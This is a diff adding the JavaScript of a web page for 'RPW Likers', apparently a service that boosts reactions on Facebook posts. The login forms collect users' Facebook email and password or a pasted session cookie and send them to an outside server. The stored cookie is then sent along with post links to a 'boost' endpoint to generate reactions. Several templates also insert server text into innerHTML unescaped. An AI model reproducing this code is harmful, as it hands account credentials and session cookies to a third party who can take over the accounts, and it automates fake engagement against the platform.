+          loginTabs.forEach(t => t.classList.remove('active'));
+          this.classList.add('active');
+          
+          // Show corresponding form
+          loginForms.forEach(form => {
+            form.classList.remove('active');
+            if (form.id === `${tabName}LoginForm`) {
+              form.classList.add('active');
+            }
+          });
+        });
+      });
+      
+      async function fetchUserStatus() {
+        if (!currentUser || !currentUser.key) return;
+        
+        try {
+          const response = await fetch(`/api/user-status/${currentUser.key}`);
+          const data = await response.json();
+          
+          if (data.success) {
+            const userData = data.data;
+            
+            currentUser.uses_used = userData.uses_used;
+            currentUser.uses_max = userData.uses_max;
+            
+            updateUsageDisplay();
+            localStorage.setItem('currentUser', JSON.stringify(currentUser));
+            
+            const now = Date.now();
+            const lastUsedDate = userData.date;
+            const cooldownMinutes = userData.uses_cd || 15;
+            const cooldownMs = cooldownMinutes * 60 * 1000;
+            
+            const timeSinceLastUse = now - lastUsedDate;
+            const remainingCooldown = cooldownMs - timeSinceLastUse;
+            
+            if (remainingCooldown > 0 && currentUser.uses_used > 0) {
+              const remainingMinutes = Math.ceil(remainingCooldown / (60 * 1000));
+              showCooldownTimer(remainingMinutes);
+            } else {
+              hideCooldownTimer();
+            }
+            
+            if (currentUser.uses_used >= currentUser.uses_max) {
+              const nextResetTime = lastUsedDate + (24 * 60 * 60 * 1000);
+              const remainingResetTime = nextResetTime - now;
+              
+              if (remainingResetTime > 0) {
+                showLimitResetTimer(remainingResetTime);
+              } else {
+                fetchUserStatus();
+              }
+            } else {
+              hideLimitResetTimer();
+            }
+          }
+        } catch (error) {
+          console.error('Error fetching user status:', error);
+        }
+      }
+
+      function showCooldownTimer(minutes) {
+        document.getElementById('cooldown-timer-container').classList.remove('hidden');
+        document.getElementById('status-info').innerHTML = `
+          <span class="cooldown-indicator cooldown-active"></span>
+          Cooldown Active
+        `;
+        document.getElementById('status-info').className = 'usage-value warning flex items-center';
+        
+        document.getElementById('submitBtn').disabled = true;
+        document.getElementById('submitBtn').classList.remove('from-purple-600', 'to-pink-600', 'hover:from-purple-700', 'hover:to-pink-700');
+        document.getElementById('submitBtn').classList.add('from-gray-600', 'to-gray-700', 'cursor-not-allowed');
+        document.getElementById('submitBtn').innerHTML = '<i class="fas fa-clock mr-2"></i>In Cooldown';
+        
+        let remainingSeconds = minutes * 60;
+        
+        function updateTimer() {
+          if (remainingSeconds <= 0) {
+            document.getElementById('cooldown-timer').innerHTML = `
+              <span class="cooldown-indicator cooldown-inactive"></span>
+              Ready
+            `;
+            hideCooldownTimer();
+            return;
+          }
+          
+          const mins = Math.floor(remainingSeconds / 60);
+          const secs = remainingSeconds % 60;
+          
+          document.getElementById('cooldown-timer').innerHTML = `
+            <span class="cooldown-indicator cooldown-active"></span>
+            ${mins}:${secs.toString().padStart(2, '0')}
+          `;
+          
+          remainingSeconds--;
+          setTimeout(updateTimer, 1000);
+        }
+        
+        updateTimer();
+      }
+
+      function hideCooldownTimer() {
+        document.getElementById('cooldown-timer-container').classList.add('hidden');
+        document.getElementById('status-info').innerHTML = `
+          <span class="cooldown-indicator cooldown-inactive"></span>
+          Ready to boost
+        `;
+        document.getElementById('status-info').className = 'usage-value success flex items-center';
+        
+        document.getElementById('submitBtn').disabled = false;
+        document.getElementById('submitBtn').classList.remove('from-gray-600', 'to-gray-700', 'cursor-not-allowed');
+        document.getElementById('submitBtn').classList.add('from-purple-600', 'to-pink-600', 'hover:from-purple-700', 'hover:to-pink-700');
+        document.getElementById('submitBtn').innerHTML = '<i class="fas fa-bolt mr-2"></i>SUBMIT';
+      }
+
+      function showLimitResetTimer(remainingMs) {
+        document.getElementById('limit-reset-container').classList.remove('hidden');
+        
+        function updateResetTimer() {
+          if (remainingMs <= 0) {
+            document.getElementById('limit-reset-timer').innerHTML = `
+              <span class="cooldown-indicator cooldown-inactive"></span>
+              Reset Complete
+            `;
+            fetchUserStatus();
+            return;
+          }
+          
+          const hours = Math.floor(remainingMs / (1000 * 60 * 60));
+          const minutes = Math.floor((remainingMs % (1000 * 60 * 60)) / (1000 * 60));
+          const seconds = Math.floor((remainingMs % (1000 * 60)) / 1000);
+          
+          document.getElementById('limit-reset-timer').innerHTML = `
+            <span class="cooldown-indicator cooldown-active"></span>
+            ${hours}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}
+          `;
+          
+          remainingMs -= 1000;
+          setTimeout(updateResetTimer, 1000);
+        }
+        
+        updateResetTimer();
+      }
+
+      function hideLimitResetTimer() {
+        document.getElementById('limit-reset-container').classList.add('hidden');
+      }
+
+  function updateUsageDisplay() {
+        if (currentUser) {
+          const maxUses = currentUser.uses_max;
+          const usedUses = currentUser.uses_used;
+          
+          document.getElementById('daily-uses').textContent = `${usedUses}/${maxUses}`;
+          document.getElementById('user-usage').textContent = `Uses: ${usedUses}/${maxUses}`;
+        }
+      }
+
+      function updateUserDisplay(user) {
+        document.getElementById('user-name').textContent = user.name;
+        document.getElementById('user-id').textContent = `UID: ${user.uid}`;
+        
+        currentUser = user;
+        updateUsageDisplay();
+        
+        document.getElementById('user-avatar').textContent = user.name.charAt(0).toUpperCase();
+        
+        const profilePic = document.getElementById('user-profile-pic');
+        if (user.profile_pictures && user.profile_pictures.v2) {
+          profilePic.src = user.profile_pictures.v2;
+          profilePic.style.display = 'block';
+          document.getElementById('user-avatar').style.display = 'none';
+        } else {
+          profilePic.style.display = 'none';
+          document.getElementById('user-avatar').style.display = 'flex';
+        }
+        
+        if (userStatusInterval) {
+          clearInterval(userStatusInterval);
+        }
+        
+        fetchUserStatus();
+        userStatusInterval = setInterval(fetchUserStatus, 30000);
+      }
+
+      function showLoginSection() {
+        document.getElementById('login-section').classList.remove('hidden');
+        document.getElementById('user-section').classList.add('hidden');
+        currentUser = null;
+        currentCookie = '';
+        
+        if (userStatusInterval) {
+          clearInterval(userStatusInterval);
+          userStatusInterval = null;
+        }
+      }
+
+      function showUserSection() {
+        document.getElementById('login-section').classList.add('hidden');
+        document.getElementById('user-section').classList.remove('hidden');
+        
+        setTimeout(() => {
+          renderTurnstile();
+        }, 1000);
+      }
+
+      function handleLoginResponse(data) {
+        if (data.success) {
+          currentUser = data.user;
+          if (data.cookie) {
+            currentCookie = data.cookie;
+            localStorage.setItem('currentCookie', data.cookie);
+          }
+          updateUserDisplay(data.user);
+          showUserSection();
+          
+          Swal.fire({
+            title: 'Login Successful!',
+            html: `
+              <div class="text-center">
+                <p class="text-lg mb-4">Welcome back, <strong>${data.user.name}</strong>!</p>
+                <div class="bg-green-500/20 border border-green-500/30 rounded-lg p-4 mt-2 text-left text-sm">
+                  <p><strong>UID:</strong> ${data.user.uid}</p>
+                  <p><strong>Daily Uses:</strong> ${data.user.uses_used}/${data.user.uses_max}</p>
+                  <p><strong>Remaining:</strong> ${data.user.uses_max - data.user.uses_used} reactions left today</p>
+                </div>
+              </div>
+            `,
+            icon: 'success',
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#10b981',
+            width: '450px',
+            confirmButtonText: 'Continue'
+          });
+        } else {
+          let errorTitle = 'Login Failed';
+          let errorMessage = data.error || 'Invalid credentials or login failed';
+          
+          if (data.error.includes('profile picture')) {
+            errorTitle = 'Profile Picture Required';
+            errorMessage = 'Please upload a profile picture first on your Facebook account before using RPW Likers.';
+          } else if (data.error.includes('Failed to login')) {
+            errorTitle = 'Login Failed';
+          }
+          
+          Swal.fire({
+            title: errorTitle,
+            text: errorMessage,
+            icon: 'error',
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#ef4444'
+          });
+        }
+      }
+
+      const savedUser = localStorage.getItem('currentUser');
+      const savedCookie = localStorage.getItem('currentCookie');
+      if (savedUser && savedCookie) {
+        currentUser = JSON.parse(savedUser);
+        currentCookie = savedCookie;
+        updateUserDisplay(currentUser);
+        showUserSection();
+      } else {
+        showLoginSection();
+      }
+      
+      setTimeout(() => {
+        document.getElementById('loading-screen').style.opacity = '0';
+        setTimeout(() => {
+          document.getElementById('loading-screen').style.display = 'none';
+          document.getElementById('main-content').classList.remove('hidden');
+          
+          AOS.init({
+            duration: 1000,
+            once: true
+          });
+          
+          setTimeout(() => {
+            if (!currentUser) {
+              Swal.fire({
+                title: 'Welcome to RPW LIKERS!',
+                html: `
+                  <div class="text-center">
+                    <p>RPWLIKERS is powered by Lara's API.</p>
+                    <p class="mt-4">Now with easy Email/Password login!</p>
+                    <p class="text-sm text-gray-400 mt-2">Choose your preferred login method above</p>
+                    <a href="https://www.facebook.com/LaraaApp" target="_blank" class="inline-block mt-2 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors">
+                      <i class="fab fa-facebook mr-2"></i>Visit Facebook Page
+                    </a>
+                  </div>
+                `,
+                icon: 'info',
+                background: '#1e1b2e',
+                color: 'white',
+                confirmButtonColor: '#8b5cf6',
+                confirmButtonText: 'Get Started',
+                width: '500px'
+              });
+            }
+          }, 1000);
+        }, 500);
+      }, 2000);
+
+      particlesJS('particles-js', {
+        particles: {
+          number: { value: 80, density: { enable: true, value_area: 800 } },
+          color: { value: "#8b5cf6" },
+          shape: { type: "circle" },
+          opacity: { value: 0.5, random: true },
+          size: { value: 3, random: true },
+          line_linked: {
+            enable: true,
+            distance: 150,
+            color: "#8b5cf6",
+            opacity: 0.2,
+            width: 1
+          },
+          move: {
+            enable: true,
+            speed: 2,
+            direction: "none",
+            random: true,
+            straight: false,
+            out_mode: "out",
+            bounce: false
+          }
+        },
+        interactivity: {
+          detect_on: "canvas",
+          events: {
+            onhover: { enable: true, mode: "repulse" },
+            onclick: { enable: true, mode: "push" },
+            resize: true
+          }
+        },
+        retina_detect: true
+      });
+
+      const emailLoginForm = document.getElementById('emailLoginForm');
+      const cookieLoginForm = document.getElementById('cookieLoginForm');
+      const emailLoginBtn = document.getElementById('emailLoginBtn');
+      const cookieLoginBtn = document.getElementById('cookieLoginBtn');
+      const logoutBtn = document.getElementById('logoutBtn');
+      const reactionForm = document.getElementById('reactionForm');
+      const submitBtn = document.getElementById('submitBtn');
+      const reactionItems = document.querySelectorAll('.reaction-item');
+      const reactionInput = document.getElementById('reaction');
+      
+      reactionItems.forEach(item => {
+        item.addEventListener('click', function() {
+          reactionItems.forEach(i => i.classList.remove('active'));
+          this.classList.add('active');
+          reactionInput.value = this.getAttribute('data-reaction');
+        });
+      });
+
+      emailLoginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
+        
+        if (!email || !password) {
+          Swal.fire({
+            icon: 'error',
+            title: 'Missing Information',
+            text: 'Please enter both email and password',
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#8b5cf6'
+          });
+          return;
+        }
+        
+        document.getElementById('loading-screen').style.display = 'flex';
+        document.getElementById('loading-screen').style.opacity = '1';
+        document.getElementById('main-content').classList.add('hidden');
+        document.querySelector('.loading-text').textContent = 'Logging in with email...';
+        
+        try {
+          const response = await fetch('https://rpwlikers.ratbu.xyz/api/login', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              email: email,
+              password: password
+            })
+          });
+          
+          const data = await response.json();
+          
+          document.getElementById('loading-screen').style.opacity = '0';
+          setTimeout(() => {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('main-content').classList.remove('hidden');
+            document.querySelector('.loading-text').textContent = 'RPW LIKERS';
+          }, 500);
+          
+          handleLoginResponse(data);
+          
+        } catch (error) {
+          console.error('Email login error:', error);
+          
+          document.getElementById('loading-screen').style.opacity = '0';
+          setTimeout(() => {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('main-content').classList.remove('hidden');
+            document.querySelector('.loading-text').textContent = 'RPW LIKERS';
+          }, 500);
+          
+          Swal.fire({
+            icon: 'error',
+            title: 'Login Failed',
+            text: 'Network error. Please check your connection and try again.',
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#8b5cf6'
+          });
+        }
+      });
+
+      cookieLoginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const cookie = document.getElementById('cookie').value.trim();
+        
+        if (!cookie) {
+          Swal.fire({
+            icon: 'error',
+            title: 'Missing Cookie',
+            text: 'Please paste your Facebook cookie',
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#8b5cf6'
+          });
+          return;
+        }
+        
+        document.getElementById('loading-screen').style.display = 'flex';
+        document.getElementById('loading-screen').style.opacity = '1';
+        document.getElementById('main-content').classList.add('hidden');
+        document.querySelector('.loading-text').textContent = 'Logging in with cookie...';
+        
+        try {
+          const response = await fetch('https://rpwlikers.ratbu.xyz/api/login', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              cookie: cookie
+            })
+          });
+          
+          const data = await response.json();
+          
+          document.getElementById('loading-screen').style.opacity = '0';
+          setTimeout(() => {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('main-content').classList.remove('hidden');
+            document.querySelector('.loading-text').textContent = 'RPW LIKERS';
+          }, 500);
+          
+          handleLoginResponse(data);
+          
+        } catch (error) {
+          console.error('Cookie login error:', error);
+          
+          document.getElementById('loading-screen').style.opacity = '0';
+          setTimeout(() => {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('main-content').classList.remove('hidden');
+            document.querySelector('.loading-text').textContent = 'RPW LIKERS';
+          }, 500);
+          
+          Swal.fire({
+            icon: 'error',
+            title: 'Login Failed',
+            text: 'Network error. Please check your connection and try again.',
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#8b5cf6'
+          });
+        }
+      });
+
+      logoutBtn.addEventListener('click', function() {
+        Swal.fire({
+          title: 'Logout?',
+          text: 'Are you sure you want to logout?',
+          icon: 'warning',
+          showCancelButton: true,
+          confirmButtonColor: '#ef4444',
+          cancelButtonColor: '#6b7280',
+          confirmButtonText: 'Yes, logout',
+          cancelButtonText: 'Cancel',
+          background: '#1e1b2e',
+          color: 'white'
+        }).then((result) => {
+          if (result.isConfirmed) {
+            localStorage.removeItem('currentUser');
+            localStorage.removeItem('currentCookie');
+            if (userStatusInterval) {
+              clearInterval(userStatusInterval);
+              userStatusInterval = null;
+            }
+            showLoginSection();
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('cookie').value = '';
+            resetTurnstile();
+            
+            Swal.fire({
+              title: 'Logged Out',
+              text: 'You have been successfully logged out.',
+              icon: 'success',
+              background: '#1e1b2e',
+              color: 'white',
+              confirmButtonColor: '#10b981'
+            });
+          }
+        });
+      });
+      
+      reactionForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        if (!currentUser || !currentCookie) {
+          Swal.fire({
+            icon: 'error',
+            title: 'Not Logged In',
+            text: 'Please login first',
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#8b5cf6'
+          });
+          return;
+        }
+        
+        if (document.getElementById('submitBtn').disabled) {
+          Swal.fire({
+            icon: 'warning',
+            title: 'Cooldown Active',
+            text: 'Please wait for the cooldown to finish before submitting another reaction.',
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#f59e0b'
+          });
+          return;
+        }
+        
+        const link = document.getElementById('link').value.trim();
+        const reaction = reactionInput.value;
+        const turnstileToken = document.getElementById('turnstileToken').value;
+        
+        if (!turnstileToken) {
+          Swal.fire({
+            icon: 'error',
+            title: 'Security Check Required',
+            text: 'Please complete the security verification before submitting.',
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#8b5cf6'
+          });
+          return;
+        }
+        
+        if (currentUser.uses_used >= currentUser.uses_max) {
+          Swal.fire({
+            icon: 'error',
+            title: 'Daily Limit Reached',
+            text: `You have reached your daily limit of ${currentUser.uses_max} reactions.`,
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#8b5cf6'
+          });
+          return;
+        }
+        
+        if (!link) {
+          Swal.fire({
+            icon: 'error',
+            title: 'Missing Information',
+            text: 'Please enter a Facebook post URL',
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#8b5cf6'
+          });
+          return;
+        }
+        
+        document.getElementById('loading-screen').style.display = 'flex';
+        document.getElementById('loading-screen').style.opacity = '1';
+        document.getElementById('main-content').classList.add('hidden');
+        document.querySelector('.loading-text').textContent = 'Submitting reactions...';
+        
+        try {
+          const response = await fetch('https://rpwlikers.ratbu.xyz/api/boost', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              cookie: currentCookie,
+              link: link,
+              reaction: reaction,
+              turnstileToken: turnstileToken
+            })
+          });
+          
+          const data = await response.json();
+          
+          document.getElementById('loading-screen').style.opacity = '0';
+          setTimeout(() => {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('main-content').classList.remove('hidden');
+            document.querySelector('.loading-text').textContent = 'RPW LIKERS';
+          }, 500);
+          
+          handleBoostResponse(data);
+          resetTurnstile();
+          
+        } catch (error) {
+          console.error('Error:', error);
+          
+          document.getElementById('loading-screen').style.opacity = '0';
+          setTimeout(() => {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('main-content').classList.remove('hidden');
+            document.querySelector('.loading-text').textContent = 'RPW LIKERS';
+          }, 500);
+          
+          let errorMessage = 'Failed to connect to the API.';
+          
+          if (error.name === 'AbortError') {
+            errorMessage = 'Request timed out. The API is taking longer than expected to respond. Please try again.';
+          } else if (error.message.includes('Failed to fetch')) {
+            errorMessage = 'Network error. Please check your internet connection and try again.';
+          } else {
+            errorMessage = `API Error: ${error.message}`;
+          }
+          
+          Swal.fire({
+            icon: 'error',
+            title: 'Connection Issue',
+            html: `
+              <div class="text-center">
+                <p class="text-lg">${errorMessage}</p>
+                <p class="text-sm text-gray-400 mt-2">The API might be temporarily busy. Please try again in a moment.</p>
+              </div>
+            `,
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#8b5cf6',
+            width: '450px',
+            confirmButtonText: 'OK'
+          });
+          resetTurnstile();
+        }
+      });
+      
+      function handleBoostResponse(data) {
+        if (data.success) {
+          fetchUserStatus();
+          
+          Swal.fire({
+            title: 'Success!',
+            html: `
+              <div class="text-center">
+                <p class="text-lg mb-4">${data.message || 'Reactions submitted successfully!'}</p>
+                <div class="bg-green-500/20 border border-green-500/30 rounded-lg p-4 mt-2 text-left text-sm">
+                  <p><strong>User:</strong> ${currentUser.name}</p>
+                  <p><strong>Reaction:</strong> ${document.getElementById('reaction').value}</p>
+                  <p><strong>Remaining Uses:</strong> ${currentUser.uses_max - currentUser.uses_used}/${currentUser.uses_max}</p>
+                  <p><strong>Cooldown:</strong> 15 minutes</p>
+                </div>
+              </div>
+            `,
+            icon: 'success',
+            background: '#1e1b2e',
+            color: 'white',
+            confirmButtonColor: '#10b981',
+            width: '450px',
+            confirmButtonText: 'OK'
+          });
+        } else {
+          if (data.status === "cooldown") {
+            const minutes = data.cd?.m || 15;
+            
+   showCooldownTimer(minutes);
+            
+            Swal.fire({
+              title: 'Cooldown Active',
+              html: `
+                <div class="text-center">
+                  <p class="text-lg mb-4">${data.error}</p>
+                  <div class="bg-orange-500/20 border border-orange-500/30 rounded-lg p-4 mt-2 text-left text-sm">
+                    <p><strong>User:</strong> ${currentUser.name}</p>
+                    <p><strong>Reaction:</strong> ${document.getElementById('reaction').value}</p>
+                    <p><strong>Cooldown:</strong> ${minutes} minute${minutes !== 1 ? 's' : ''}</p>
+                    <p><strong>Current Usage:</strong> ${currentUser.uses_used}/${currentUser.uses_max}</p>
+                    <p class="text-orange-400"><i class="fas fa-clock mr-1"></i> Please wait before submitting another reaction</p>
+                  </div>
+                </div>
+              `,
+              icon: 'warning',
+              background: '#1e1b2e',
+              color: 'white',
+              confirmButtonColor: '#f59e0b',
+              width: '500px',
+              confirmButtonText: 'OK'
+            });
+          } else if (data.status === "limit") {
+            const hours = data.cd?.h || 24;
+            const minutes = data.cd?.m || 0;
+            
+            fetchUserStatus();
+            
+            Swal.fire({
+              title: 'Daily Limit Reached',
+              html: `
+                <div class="text-center">
+                  <p class="text-lg mb-4">${data.error}</p>
+                  <div class="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-4 mt-2 text-left text-sm">
+                    <p><strong>User:</strong> ${currentUser.name}</p>
+                    <p><strong>Limit:</strong> ${currentUser.uses_max} reactions per day</p>
+                    <p><strong>Reset Time:</strong> ${hours} hour${hours !== 1 ? 's' : ''} and ${minutes} minute${minutes !== 1 ? 's' : ''}</p>
+                    <p><strong>Status:</strong> <span class="text-yellow-400">Please wait for daily reset or use different account</span></p>
+                  </div>
+                </div>
+              `,
+              icon: 'warning',
+              background: '#1e1b2e',
+              color: 'white',
+              confirmButtonColor: '#f59e0b',
+              width: '500px',
+              confirmButtonText: 'OK'
+            });
+          } else {
+            Swal.fire({
+              title: 'Error',
+              html: `
+                <div class="text-center">
+                  <p class="text-lg mb-4">${data.error}</p>
+                  <div class="bg-red-500/20 border border-red-500/30 rounded-lg p-4 mt-2 text-left text-sm">
+                    <p><strong>User:</strong> ${currentUser.name}</p>
+                    <p><strong>Reaction:</strong> ${document.getElementById('reaction').value}</p>
+                  </div>
+                </div>
+              `,
+              icon: 'error',
+              background: '#1e1b2e',
+              color: 'white',
+              confirmButtonColor: '#ef4444',
+              width: '500px',
+              confirmButtonText: 'OK'
+            });
+          }
+        }
+      }
+      
+      gsap.to('.floating', {
+        y: 15,
+        duration: 2,
+        repeat: -1,
+        yoyo: true,
+        ease: "power1.inOut"
+      });
+    });
+  </script>
+</body>
+</html>
